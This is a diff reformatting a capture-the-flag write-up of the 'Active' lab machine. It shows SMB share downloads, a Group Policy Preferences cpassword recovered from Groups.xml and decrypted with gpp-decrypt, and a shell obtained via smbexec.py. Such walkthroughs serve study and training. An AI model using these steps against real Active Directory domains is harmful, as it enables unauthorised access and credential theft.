@@ -69,7 +69,6 @@ smb: \> ls
 
 We can download all the files present within the machine using these commands, and I saw an interesting file:
 
-{% code overflow="wrap" %}
 ```
 mask ""
 recurse ON
@@ -77,17 +76,14 @@ prompt OFF
 mget *
 getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (16.8 KiloBytes/sec) (average 23.8 KiloBytes/sec)
 ```
-{% endcode %}
 
 Within this file, we can find an encrypted pasword:
 
-{% code overflow="wrap" %}
 ```markup
 <?xml version="1.0" encoding="utf-8"?>
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
 </Groups>
 ```
-{% endcode %}
 
 This was a GPO password, and it can be decrypted using `gpp-decrypt` since we have the key and the password.
 
@@ -146,6 +142,6 @@ Session completed.
 
 Then, we can get a shell via `smbexec.py`.
 
-<figure><img src="../../../.gitbook/assets/image (989).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(989).png>)
 
 Rooted!
